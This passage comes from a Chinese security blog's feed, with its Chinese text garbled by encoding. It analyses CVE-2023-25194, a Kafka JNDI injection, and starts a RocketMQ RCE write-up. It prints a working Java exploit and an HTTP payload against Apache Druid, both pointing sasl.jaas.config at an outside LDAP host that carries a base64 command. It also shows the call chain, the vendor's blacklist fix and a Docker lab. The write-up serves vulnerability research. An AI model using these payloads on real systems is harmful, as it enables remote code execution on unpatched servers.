class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        props.put(<span class="string">&quot;batch.size&quot;</span>, <span class="number">16384</span>);</span><br><span class="line">        props.put(<span class="string">&quot;buffer.memory&quot;</span>, <span class="number">33554432</span>);</span><br><span class="line">        props.put(<span class="string">&quot;linger.ms&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sasl</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">        </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * ProducerRecord å‚æ•°è§£æ ç¬¬ä¸€ä¸ªï¼štopic_nameä¸ºç”Ÿäº§è€… topicåç§°,</span></span><br><span class="line"><span class="comment">        * ç¬¬äºŒä¸ªï¼šå¯¹äºç”Ÿäº§è€…kafka2.0éœ€è¦ä½ æŒ‡å®šä¸€ä¸ªkey</span></span><br><span class="line"><span class="comment">        * ,åœ¨ä¼ä¸šåº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šæŠŠä»–å½“åšbusinessIdæ¥ç”¨ï¼Œæ¯”å¦‚è®¢å•ID,ç”¨æˆ·IDç­‰ç­‰ã€‚ ç¬¬ä¸‰ä¸ªï¼šæ¶ˆæ¯çš„ä¸»è¦ä¿¡æ¯</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">              producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;String, String&gt;(<span class="string">&quot;topic_name&quot;</span>, Integer.toString(i), <span class="string">&quot;message info&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ¼æ´è§¦å‘ç‚¹å…¶å®æ˜¯åœ¨ <code>com.sun.security.auth.module.JndiLoginModule#attemptAuthentication</code> æ–¹æ³•å¤„</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/lookup.png" class><p>ç†é¡ºé€»è¾‘å¾ˆå®¹æ˜“æ„é€ å‡º EXP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class="line">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class EXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.put(&quot;bootstrap.servers&quot;, &quot;127.0.0.1:1234&quot;);</span><br><span class="line">        properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line">        properties.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line"></span><br><span class="line">        properties.put(&quot;sasl.mechanism&quot;, &quot;PLAIN&quot;);</span><br><span class="line">        properties.put(&quot;security.protocol&quot;, &quot;SASL_SSL&quot;);</span><br><span class="line">        properties.put(&quot;sasl.jaas.config&quot;, &quot;com.sun.security.auth.module.JndiLoginModule &quot; +</span><br><span class="line">                &quot;required &quot; +</span><br><span class="line">                &quot;user.provider.url=\&quot;ldap://124.222.21.138:1389/Basic/Command/Base64/Q2FsYw==\&quot; &quot; +</span><br><span class="line">                &quot;useFirstPass=\&quot;true\&quot; &quot; +</span><br><span class="line">                &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; kafkaConsumer = new KafkaConsumer&lt;&gt;(properties);</span><br><span class="line">        kafkaConsumer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/EXP.png" class><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å‰é¢æœ‰éå¸¸å¤šçš„æ•°æ®å¤„ç†ä¸èµ‹å€¼ï¼Œè¿™é‡Œå°±è·³è¿‡äº†ï¼Œç›´æ¥çœ‹ <code>org.apache.kafka.clients.consumer.KafkaConsumer</code> ç±»çš„ç¬¬ 177 è¡Œ <code>ClientUtils.createChannelBuilder()</code>ï¼Œè·Ÿè¿›ã€‚</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/createChannelBuilder.png" class><p>ç»§ç»­è·Ÿè¿›ï¼Œè¿™é‡Œä¼šå…ˆåˆ¤æ–­ SASL æ¨¡å¼æ˜¯å¦å¼€å¯ï¼Œåªæœ‰å¼€å¯äº†æ‰ä¼šå¾€ä¸‹è·Ÿè¿›åˆ° <code>create()</code> æ–¹æ³•</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/SASL_SSL.png" class><p>è·Ÿè¿› <code>create()</code> æ–¹æ³•ï¼Œåšå®Œå®¢æˆ·ç«¯çš„åˆ¤æ–­å’Œå®‰å…¨åè®®çš„åˆ¤æ–­ä¹‹åï¼Œè°ƒç”¨äº† <code>loadClientContext()</code> æ–¹æ³•ï¼Œè·Ÿè¿›ï¼Œå‘ç°å…¶ä¸­è¿˜æ˜¯åŠ è½½äº†ä¸€äº›é…ç½®ã€‚</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loadClientContext.png" class><p>è·³å‡ºæ¥ï¼Œè·Ÿè¿› <code>((ChannelBuilder)channelBuilder).configure(configs)</code> æ–¹æ³•ï¼Œæœ€åè·Ÿåˆ° <code>org.apache.kafka.common.security.authenticator.LoginManager</code> çš„æ„é€ å‡½æ•°ã€‚</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/LoginManager.png" class><p>è·Ÿè¿› <code>login()</code> æ–¹æ³•ï¼Œæ­¤å¤„ <code>new LoginContext()</code>ï¼Œéšåè°ƒç”¨ <code>login()</code> æ–¹æ³•ï¼Œè·Ÿè¿›</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loginContext.png" class><p>è¿™é‡Œä¼šè°ƒç”¨ <code>JndiLoginModule</code> çš„ <code>initialize()</code> æ–¹æ³•</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/moduleStack.png" class><p>åˆå§‹åŒ–å®Œæˆä¹‹åï¼Œæ­¤å¤„è°ƒç”¨ <code>JndiLoginModule</code> çš„ <code>login()</code> æ–¹æ³•ï¼Œæœ€ååˆ° <code>JndiLoginModule</code> çš„ <code>attemptAuthentication()</code> æ–¹æ³•ï¼Œå®Œæˆ Jndi æ³¨å…¥ã€‚</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/down.png" class><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>åœ¨ 3.4.0 ç‰ˆæœ¬ä¸­, å®˜æ–¹çš„ä¿®å¤æ–¹å¼æ˜¯å¢åŠ äº†å¯¹ <code>JndiLoginModule</code> çš„é»‘åå•</p><p><code>org.apache.kafka.common.security.JaasContext#throwIfLoginModuleIsNotAllowed</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">throwIfLoginModuleIsNotAllowed</span><span class="params">(AppConfigurationEntry appConfigurationEntry)</span> &#123;</span><br><span class="line">    Set&lt;String&gt; disallowedLoginModuleList = (Set)Arrays.stream(System.getProperty(<span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span>, <span class="string">&quot;com.sun.security.auth.module.JndiLoginModule&quot;</span>).split(<span class="string">&quot;,&quot;</span>)).map(String::trim).collect(Collectors.toSet());</span><br><span class="line">    <span class="type">String</span> <span class="variable">loginModuleName</span> <span class="operator">=</span> appConfigurationEntry.getLoginModuleName().trim();</span><br><span class="line">    <span class="keyword">if</span> (disallowedLoginModuleList.contains(loginModuleName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(loginModuleName + <span class="string">&quot; is not allowed. Update System property &#x27;&quot;</span> + <span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span> + <span class="string">&quot;&#x27; to allow &quot;</span> + loginModuleName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Apache-Druid-RCE-via-Kafka-Clients"><a href="#Apache-Druid-RCE-via-Kafka-Clients" class="headerlink" title="Apache Druid RCE via Kafka Clients"></a>Apache Druid RCE via Kafka Clients</h2><p>å½±å“ç‰ˆæœ¬ï¼šApache Druid &lt;&#x3D; 25.0.0</p><p>Apache Druid æ˜¯ä¸€ä¸ªå®æ—¶åˆ†æå‹æ•°æ®åº“, å®ƒæ”¯æŒä» Kafka ä¸­å¯¼å…¥æ•°æ® (Consumer) , å› ä¸ºç›®å‰æœ€æ–°ç‰ˆæœ¬çš„ Apache Druid 25.0.0 æ‰€ç”¨Â <code>kafka-clients</code>Â ä¾èµ–çš„ç‰ˆæœ¬ä»ç„¶æ˜¯ 3.3.1, å³å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬, æ‰€ä»¥å¦‚æœç›®æ ‡ Druid å­˜åœ¨æœªæˆæƒè®¿é—® (é»˜è®¤é…ç½®æ— èº«ä»½è®¤è¯), åˆ™å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å®ç° RCE</p><p>æœ‰æ„æ€çš„æ˜¯, Druid åŒ…å«äº†Â <code>commons-beanutils:1.9.4</code>Â ä¾èµ–, æ‰€ä»¥å³ä½¿åœ¨é«˜ç‰ˆæœ¬ JDK çš„æƒ…å†µä¸‹ä¹Ÿèƒ½é€šè¿‡ LDAP JNDI æ‰“ååºåˆ—åŒ– payload å®ç° RCE</p><ul><li>æ¼æ´ UI å¤„è§¦å‘ç‚¹ï¼šDruid Web Console - Load data - Apache Kafka</li></ul><p>åœ¨è¿™é‡Œå¯ä»¥åŠ è½½ Kafka çš„ Dataï¼Œå…¶ä¸­å¯ä»¥ä¿®æ”¹é…ç½®é¡¹ <code>sasl.jaas.config</code>ï¼Œç”±æ­¤æ„é€  Payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://124.222.21.138:8888/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.21.138:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>916</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.21.138:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.21.138:8888/unified-console.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;consumerProperties&quot;</span>:&#123;<span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:1234&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://124.222.21.138:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">&#125;,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,<span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;,<span class="string">&quot;granularitySpec&quot;</span>:&#123;<span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span>&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidAttack.png" class><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/success-25194.png" class><p>åœ¨ <code>druid-kafka-indexing-service</code> è¿™ä¸ª extension ä¸­å¯ä»¥çœ‹åˆ°å®ä¾‹åŒ– KafkaConsumer çš„è¿‡ç¨‹</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/KafkaRecordSupplier.png" class><p>è€Œä¸Šé¢ç¬¬ 286 è¡Œçš„ <code>addConsumerPropertiesFromConfig()</code> æ­£æ˜¯è¿›è¡Œäº†åŠ¨æ€ä¿®æ”¹é…ç½®</p><p>Apache Druid 26.0.0 æ›´æ–°äº† kafka ä¾èµ–çš„ç‰ˆæœ¬</p><p><a class="link" href="https://github.com/apache/druid/blob/26.0.0/pom.xml#L79">https://github.com/apache/druid/blob/26.0.0/pom.xml#L79<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidNewVersion.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-25194 æ¼æ´åˆ†æ</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-37582 Apache RocketMQ RCE æ¼æ´åˆ†æ</title>
    <link href="https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-21T03:42:50.000Z</published>
    <updated>2023-11-27T01:51:33.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-37582-æ¼æ´åˆ†æ"><a href="#CVE-2023-37582-æ¼æ´åˆ†æ" class="headerlink" title="CVE-2023-37582 æ¼æ´åˆ†æ"></a>CVE-2023-37582 æ¼æ´åˆ†æ</h1><p>è°ƒè¯•ç«¯å£</p><p>10011 broker<br>10012 namsrv</p><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p>RocketMQ æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯ä¸­é—´ä»¶ï¼ŒNameServer ä¸º Producer å’Œ Consumer èŠ‚ç‚¹æä¾›è·¯ç”±ä¿¡æ¯çš„ç»„ä»¶ã€‚</p><p>ç”±äº CVE-2023-33246 çš„è¡¥ä¸ä¸­å¹¶æœªå¯¹ DefaultRequestProcessor#updateConfig æ–¹æ³•ä¸­çš„ configStorePath å±æ€§å€¼è¿›è¡Œè¿‡æ»¤ï¼Œå½“ NameServer åœ°å€æš´éœ²åœ¨å…¬ç½‘å¹¶ä¸”ç¼ºä¹æƒé™æ ¡éªŒï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ payload æ³¨å…¥åˆ° configStorePath ä¸­ï¼Œè°ƒç”¨ NameServer çš„æ›´æ–°é…ç½®å‡½æ•°å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ° RocketMQ æœåŠ¡å™¨ä¸­å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><h2 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.1<br>Apache RocketMQ &lt;&#x3D; 4.9.6</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å…ˆ wget éœ€è¦çš„ä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip</span><br></pre></td></tr></table></figure><p>ç„¶å <strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://mirrors.tuna.tsinghua.edu.cn/apache/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10012</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10011</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é‡Œç”¨ä¹‹å‰ CVE-2023-33246 çš„ç¯å¢ƒä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æœ€å¥½æ˜¯ç”¨ 4.x çš„ï¼Œä¸‹è½½ç¯å¢ƒéœ€è¦ä¸€æ®µæ—¶é—´</p><h2 id="æ¼æ´å¤ç°ä¸åˆ†æ"><a href="#æ¼æ´å¤ç°ä¸åˆ†æ" class="headerlink" title="æ¼æ´å¤ç°ä¸åˆ†æ"></a>æ¼æ´å¤ç°ä¸åˆ†æ</h2><p>è¿™ä¸ªæ¼æ´æœ¬è´¨ä¸Šæ˜¯ CVE-2023-33246 çš„è¡¥ä¸ç»•è¿‡ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥è¯´æ ¹æœ¬æ²¡æœ‰åšä»€ä¹ˆé˜²æŠ¤ï¼Œå…ˆæ¥çœ‹ diff</p><p><a 